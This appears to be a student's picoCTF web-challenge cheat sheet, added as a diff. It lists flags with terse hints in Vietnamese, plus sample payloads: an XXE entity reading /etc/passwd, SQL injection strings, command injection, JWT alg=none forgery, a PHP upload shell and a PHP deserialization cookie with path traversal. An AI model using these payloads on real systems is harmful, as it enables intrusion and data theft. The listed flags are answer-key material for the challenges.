@@ -1,0 +1,57 @@
+1.IntroToBurp:picoCTF{#0TP_Bypvss_SuCc3$S_c94b61ac} #Xóa payload otp
+2.Bookmarklet:picoCTF{p@g3_turn3r_18d2fa20} #chạy javascript bằng dấu trang, thanh tìm kiếm
+3.Local Authority:picoCTF{j5_15_7r4n5p4r3n7_a8788e61} #ctrl U bấm vào secure.js 
+4.Inspect HTML:picoCTF{1n5p3t0r_0f_h7ml_8113f7e2} #đọc html
+5.Includes:picoCTF{1nclu51v17y_1of2_f7w_2of2_b8f4b022} #đọc file css và js
+6.Scavenger Hunt:picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_d375c750}        css js /.htaccess /robots.txt /.DS_Store
+7.dont-use-client-side:picoCTF{no_clients_plz_b706c5}  #đọc js verify pass
+8.logon:picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc} #thay đổi value trong cookie phần application
+9.Insp3ct0r:picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?2e7b23e3} #tìm trong html css js
+10.where are the robots:picoCTF{ca1cu1at1ng_Mach1n3s_1bb4c} #/robots.txt
+11.Trickster: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9} #shell php thêm chữ PNG lên đầu #ls al / #cat /var/www/html/G4ZTCOJYMJSDS.txt
+12.SOAP: picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d} #lỗ hổng xxe https://portswigger.net/web-security/xxe 
+'''
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<data><ID>&xxe;</ID></data>
+'''
+13.SQL Injection: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6} #username=duc193&password='or 1=1;-- #' OR 1=1;-- để cho passwd là đúng 
+#Tìm hiểu thêm SQLI: union ; blind; delete
+14. MatchTheRegex: picoCTF{succ3ssfully_matchtheregex_0694f25b} #Ctrl U ra regex ^p.....F!? thì nhập vào p.....F! là được 
+15. Java Code Analysis!?!: picoCTF{w34k_jwt_n0t_g00d_6e5d7df5} #Application -> local stogare #https://jwt.io/ thay đổi thuộc tính, phải biết code secret
+16. Findme: picoCTF{proxies_all_the_way_a0fe074f} #chuyển hướng id = .... burp suite
+17. SQLiLite: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac} #SQLI 'or 1=1;-- 
+18. SQL Direct :picoCTF{L3arN_S0m3_5qL_t0d4Y_73b0678f} #\dt #SELECT * FROM flags 
+19. Secrets: picoCTF{succ3ss_@h3n1c@10n_790d2615} #http://saturn.picoctf.net:50940/secret/ nhớ dấu "/" #http://saturn.picoctf.net:50940/secret/hidden/superhidden/
+20. Search source: picoCTF{1nsp3ti0n_0f_w3bpag3s_ec95fa49} #Ctrl F trong file css
+21. Roboto Sans: picoCTF{Who_D03sN7_L1k5_90B0T5_718c9043} #vô robots.txt decode base64 vào /js/myfile.txt
+22. Power Cookie: picoCTF{gr4d3_A_c00k13_65fd1e1a} #đổi cookie
+23. Forbidden Paths: picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc} #../ để quay về folder trước
+24. JAuth : #picoCTF{succ3ss_@u7h3nt1c@710n_3444eacf} #thay đổi jwt trong top.dev , alg = none và thêm dấu . đằng sau 
+25. CAAS : picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o} #injection hi;ls hi;cat falg.txt
+26. Login: picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r} #Ctrl U decode base64
+27. Super Serial: picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_261d1dcc}
+Đọc File cookie.phps 
+KEY: Deserialization , hàm unserialize nghĩ ngay tới tuần tự hóa
+
+#Tuần tự hóa Code->base64 -> urlencode : 0:10:"access_log":1:{s:8:"log_file",s:7:"../flag";}
+
+O:10:"access_log":
+O là ký hiệu cho thấy đây là một đối tượng.
+10 là độ dài của tên lớp (ở đây là access_log, gồm 10 ký tự).
+"access_log" là tên của lớp đối tượng.
+:1:: Số thuộc tính trong đối tượng (ở đây chỉ có 1 thuộc tính là log_file).
+s:8:"log_file":
+s biểu thị chuỗi (string).
+8 là độ dài của tên thuộc tính log_file.
+"log_file" là tên thuộc tính của đối tượng.
+s:7:"../flag":
+s biểu thị giá trị kiểu chuỗi.
+7 là độ dài của giá trị ../flag.
+"../flag" là giá trị của thuộc tính log_file.
+
+ => "TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"
+send to cookie
+
+requests python  headers: {"cookie": "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"}
+là ra 
